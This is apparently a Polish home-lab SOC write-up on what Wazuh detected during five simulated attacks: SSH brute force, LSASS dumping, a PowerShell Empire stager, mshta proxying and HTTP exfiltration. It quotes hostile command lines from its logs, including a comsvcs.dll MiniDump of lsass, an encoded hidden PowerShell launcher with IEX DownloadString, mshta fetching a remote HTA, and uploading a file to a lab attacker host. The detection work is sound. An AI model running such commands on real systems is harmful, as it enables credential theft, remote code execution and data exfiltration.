# 04 — Wyniki detekcji

Dokument pokazuje, co realnie widać w dashboardzie Wazuh po wykonaniu scenariuszy z [03-attack-scenarios.md](03-attack-scenarios.md). Screenshoty są zastąpione szczegółowymi opisami — w prawdziwym repo wstaw pliki PNG do katalogu `docs/screenshots/`.

---

## Konwencja oznaczeń

- **Poziom alertu (level):** skala Wazuh 0–15. W praktyce SOC: <7 ignorujemy, 7–9 to interesujące, 10–12 = triage, 13–15 = natychmiastowa eskalacja.
- **Rule ID:** numery 100xxx to nasze custom; <10000 to wbudowane.
- **MITRE tags:** każda reguła ma tagowanie MITRE w polu `rule.mitre.id` / `rule.mitre.technique`.

---

## Scenariusz 1 — Brute Force SSH

### Po stronie atakującego (Kali)

```
[ATTEMPT] target 192.168.10.10 - login "root" - pass "123456" - 1 of 14344392
[ATTEMPT] target 192.168.10.10 - login "root" - pass "12345" - 2 of 14344392
[ATTEMPT] target 192.168.10.10 - login "root" - pass "123456789" - 3 of 14344392
...
[ssh] 1 of 1 target completed, 0 valid passwords found
```

### Po stronie Wazuh

**[Screenshot: dashboard "Security Events", widok ostatnich 30 minut, pokazujący 47 alertów level 5–10 z rule.groups zawierającym `authentication_failed`, wszystkie z `srcip:192.168.30.30`, agent `wazuh-srv` (000). Widoczna jest charakterystyczna pionowa kolumna na wykresie czasowym o jednolitym, równym tempie ~20/min.]**

**[Screenshot: pojedyncze otwarte zdarzenie level 10 z rule.id 5712 ("sshd: Possible attack on the system"), w polach JSON: `srcip: 192.168.30.30`, `dstuser: root`, `data.protocol: ssh`. W tagu MITRE: T1110.]**

**[Screenshot: nasza custom rule 100110 ("Brute force SSH from external segment") wystrzeliła po 12 nieudanych próbach. Level 12, MITRE: T1110.001. W polu `rule.description` widać: "Brute force SSH from external segment (VLAN 30) — 12 failed attempts in 60s from 192.168.30.30".]**

### Stan po teście

```bash
sudo /var/ossec/bin/agent_control -s -i 000   # statystyki agenta managera
sudo grep "rule.*100110" /var/ossec/logs/alerts/alerts.json | tail -5
```

W praktyce alert level 12 wywołałby też **Active Response** — Wazuh sam dodał regułę firewallową blokującą `192.168.30.30` na 600 s. Konfiguracja w `/var/ossec/etc/ossec.conf`:

```xml
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>100110</rules_id>
  <timeout>600</timeout>
</active-response>
```

---

## Scenariusz 2 — LSASS Dump

### Wykonanie

```
PS C:\attacks> .\02-mimikatz-simulation.ps1
[+] Resolving lsass.exe PID... found: 624
[+] Calling MiniDumpWriteDump...
[+] Dump written to: C:\Windows\Temp\lsass.dmp (size: 47.2 MB)
[+] Attempting alternate technique via comsvcs.dll...
[+] Dump written to: C:\Windows\Temp\lsass2.dmp (size: 47.1 MB)
```

### Po stronie Wazuh

**[Screenshot: Discover, filtr `rule.id:100210`, pojedynczy alert level 14, czas 14:31:08. Pola w surowym evencie:
- `data.win.system.eventID: 10`
- `data.win.eventdata.sourceImage: C:\\Tools\\dumper.exe`
- `data.win.eventdata.targetImage: C:\\Windows\\System32\\lsass.exe`
- `data.win.eventdata.grantedAccess: 0x1410`
- `data.win.eventdata.callTrace: C:\\Windows\\System32\\ntdll.dll+9d2b4|...|dbghelp.dll+e8c1`
- `rule.mitre.technique: ["OS Credential Dumping"]`
- `rule.mitre.id: ["T1003.001"]`
]**

**[Screenshot: drugi alert level 13, rule 100211 ("LSASS dump via comsvcs.dll"). Pola:
- `data.win.eventdata.image: C:\\Windows\\System32\\rundll32.exe`
- `data.win.eventdata.commandLine: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass2.dmp full`
- `data.win.eventdata.parentImage: C:\\Windows\\System32\\cmd.exe`
]**

**[Screenshot: widok "MITRE ATT&CK" w Wazuh — macierz technik. Pole T1003.001 podświetlone na czerwono z licznikiem "2 alerts".]**

**[Screenshot: widok "Security Events" — timeline pokazujący sekwencję w czasie ~3 sekund: EID 1 (process create dumper.exe), EID 10 (process access lsass.exe), EID 11 (file create lsass.dmp). To jest klasyczny pattern, który analityk czyta od razu jako "credential dump in progress".]**

### Interpretacja

Reguła 100210 jest **wysokokonfidencyjna**. Granted access 0x1410 = `PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION` — to dokładnie maska, której potrzeba do dumpowania pamięci. Legitne procesy (antywirus, sysmon) używają innych masek.

False positives, których się spodziewam: produkty EDR jakie? CrowdStrike, Defender for Endpoint czasem czytają LSASS jako część skanowania. Trzeba excludować po `data.win.eventdata.sourceImage` (whitelisting).

---

## Scenariusz 3 — PowerShell Empire C2

### Wykonanie

```powershell
PS C:\Users\akowalska> C:\Temp\launcher.bat
(okno znika błyskawicznie, brak interakcji z użytkownikiem)
```

W Empire CLI po stronie napastnika:

```
(Empire) > agents
[*] Active agents:
 Name     La  Internal IP     Machine Name    Username             Process            Delay    Last Seen
 ----     --  -----------     ------------    --------             -------            -----    ---------
 ABCDE123 ps  192.168.20.20   ws01.soclab.local SOCLAB\akowalska   powershell/3924    5/0.0    2026-05-21 14:42:11
```

### Po stronie Wazuh — sekwencja alertów

**[Screenshot: Discover, sortowane po `timestamp` rosnąco, filtr `agent.name:"ws01"`, okno 14:41:00–14:42:30. Widać 6 alertów w tej kolejności:

1. `14:41:55.122` — level 7, rule 92211 (wbudowana) — "Suspicious cmd.exe command line"
2. `14:41:55.450` — level 11, rule **100212** — "Suspicious PowerShell EncodedCommand" — w polu `data.win.eventdata.commandLine` widać: `powershell.exe -NoP -sta -NonI -W Hidden -Enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAg...` (~400 znaków base64)
3. `14:41:55.781` — level 8, rule **100214** — "PowerShell with IEX and DownloadString" — w `data.win.eventdata.scriptBlockText` widać dekodowaną komendę z `IEX (New-Object Net.WebClient).DownloadString(...)`
4. `14:41:56.012` — level 10, rule **100213** — "PowerShell network connection to external IP" — `data.win.eventdata.destinationIp: 192.168.30.30`
5. `14:42:01.331` — level 10, rule 100213 (powtórzenie — beacon co 5 s)
6. `14:42:06.541` — j.w.
]**

**[Screenshot: zoom na alert 100214 — sekcja `data.win.eventdata.scriptBlockText` zawiera prawie 4 KB skryptu Empire stagera. Widać charakterystyczne fragmenty: `[Reflection.Assembly]::Load`, `System.IO.Compression.DeflateStream`, `[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`.]**

### Korelacja zdarzeń

W produkcji dodalibyśmy regułę kompozytową (Wazuh `frequency`):

> Jeśli w ciągu 60 s dla tego samego `agent.name` strzelą reguły 100212, 100213 i 100214 — wygeneruj nowy alert level 14 "Likely PowerShell C2 framework execution".

Taka reguła **jest** w naszym pliku (rule 100299, składa pierwsze trzy w jeden meta-alert).

**[Screenshot: meta-alert 100299, level 14, opis: "Multi-stage PowerShell C2 detected: encoded command + IEX/DownloadString + external connection within 60s on ws01". To jest typ alertu, który **budzi analityka o 2 w nocy**.]**

---

## Scenariusz 4 — `mshta` jako proxy

### Wykonanie

```powershell
PS C:\attacks> .\04-suspicious-process.ps1
[+] Generated C:\Windows\Temp\evil.hta
[+] Launching via mshta.exe...
```

### Po stronie Wazuh

**[Screenshot: alert level 13, rule 100221 ("Suspicious parent-child: mshta spawning script interpreter"). Pole `data.win.eventdata.parentImage: C:\\Windows\\System32\\mshta.exe`, `image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`. To jest pattern, który prawie nigdy nie występuje w legalnym ruchu.]**

**[Screenshot: drugi alert level 12, rule 100220 ("mshta.exe executing remote HTA file") gdy uruchomimy wariant z URL. `data.win.eventdata.commandLine: mshta.exe http://192.168.30.30:8000/evil.hta`. MITRE T1218.005.]**

**[Screenshot: widok "Agent Inventory" → `ws01` → "Processes" w Wazuh — widać drzewo procesów: `cmd.exe` (8412) → `mshta.exe` (5102) → `powershell.exe` (3924). Czytelne na pierwszy rzut oka.]**

### Co tutaj jest cenne

`mshta` ma w produkcji praktycznie **zero legalnych zastosowań w 2026**. Stare aplikacje HTA były normalne ok. 2005–2012; obecnie ich nie ma. Jeśli `mshta.exe` startuje cokolwiek, to z prawdopodobieństwem >95% jest to atak. Dlatego dajemy level 13 — wysoki, ale nie maksymalny (15 zostawiamy na potwierdzony ransomware / data destruction).

---

## Scenariusz 5 — Exfil HTTP POST

### Wykonanie

```bash
PS C:\attacks> python 05-data-exfiltration.py --target http://192.168.30.30:8000/upload --file C:\Windows\Temp\loot.zip
[+] File: loot.zip (12.4 MB)
[+] Chunks: 13 of 1 MB
[+] Sending chunk 1/13... OK (200)
[+] Sending chunk 2/13... OK (200)
...
[+] Sending chunk 13/13... OK (200)
[+] Done. Total time: 47s
```

### Po stronie Wazuh

**[Screenshot: agregat 13 alertów rule 100230 w oknie 47 s, każdy level 8 indywidualnie. Wykres słupkowy "Top agents" pokazuje WS01 jako outlier — w ciągu minuty wygenerował 5× więcej event-ów sieciowych niż pozostałe hosty razem.]**

**[Screenshot: po włączeniu reguły 100231 (korelacja zip + outbound) widać meta-alert level 12 ("Suspicious archive creation followed by external connection — possible data exfiltration"). Description rozwija się pokazując łańcuch: FileCreate loot.zip → NetworkConnect ×13 to 192.168.30.30:8000.]**

**[Screenshot: pivot na pole `data.win.eventdata.user` — `SOCLAB\\akowalska`. Pivot na `agent.name` → `ws01`. To wystarcza, żeby otworzyć ticket: "Possible exfil from ws01 by user akowalska to external IP 192.168.30.30 — ~12 MB transferred".]**

### Limity tej detekcji

Reguła łapie naiwny scenariusz "wyślij archiwum HTTP". Realne ataki używają:
- DNS exfil (małe chunki w queries) — wymaga osobnej reguły na statystyki DNS,
- Cloud (Dropbox, Mega, AWS S3) — wymaga DLP albo TLS inspection,
- Steganografia w obrazach — praktycznie niewykrywalne bez DLP behavioralnego.

To są tickety pod **Lessons Learned**.

---

## Statystyki na koniec sesji (~2h pełnego testowania)

| Rule ID | Opis | Trafienia | Avg level | TP / FP |
|---|---|---|---|---|
| 100110 | Brute force SSH external | 3 | 12 | 3 TP / 0 FP |
| 100210 | LSASS memory access | 4 | 14 | 4 TP / 0 FP |
| 100211 | LSASS dump via comsvcs | 2 | 13 | 2 TP / 0 FP |
| 100212 | PS EncodedCommand | 28 | 11 | 12 TP / 16 FP* |
| 100213 | PS network connection | 19 | 10 | 9 TP / 10 FP |
| 100214 | PS IEX + DownloadString | 8 | 12 | 8 TP / 0 FP |
| 100220 | mshta remote HTA | 1 | 12 | 1 TP / 0 FP |
| 100221 | mshta spawns interpreter | 2 | 13 | 2 TP / 0 FP |
| 100230 | Large data transfer ext | 17 | 8 | 13 TP / 4 FP |
| 100231 | Archive + outbound corr | 1 | 12 | 1 TP / 0 FP |
| 100299 | Meta: PS C2 chain | 2 | 14 | 2 TP / 0 FP |

\* FP dla 100212 to głównie skrypty admina Windows Update i Defender — uzasadnienie do tuningu (whitelist po `parentImage`).

---

## Wnioski z testów

1. **Reguły kompozytowe (frequency / EQL-like) dają drastycznie lepsze wyniki niż pojedyncze.** Rule 100299 ma 100% TP, podczas gdy jej składowe (100212, 100213, 100214) mają mieszane wyniki. Dlatego inwestujemy w detection-as-code zamiast pojedynczych pattern-matchy.
2. **Sysmon jest niezbędny.** Bez EID 10 (ProcessAccess) reguła 100210 jest niemożliwa — sam Windows Security Log nie daje takiej widoczności.
3. **Tagowanie MITRE w regułach okazało się złotem.** Filtrowanie po `rule.mitre.id` w dashboardzie pozwala na natychmiastową odpowiedź na pytanie "ile mamy detekcji T1003?". W produkcji zrobiłbym z tego dashboard kierowniczy.
4. **Active Response wymaga tuningu.** W labie blokujemy IP od razu; w produkcji ryzykujemy zablokowaniem siebie samych (FP → analityk traci dostęp). Praktyczna konfiguracja: AR tylko dla level ≥ 12 i tylko poza godzinami pracy.

Następnie: [reports/incident-report-template.md](../reports/incident-report-template.md) — szablon raportu IR, który wypełniam dla każdego scenariusza.
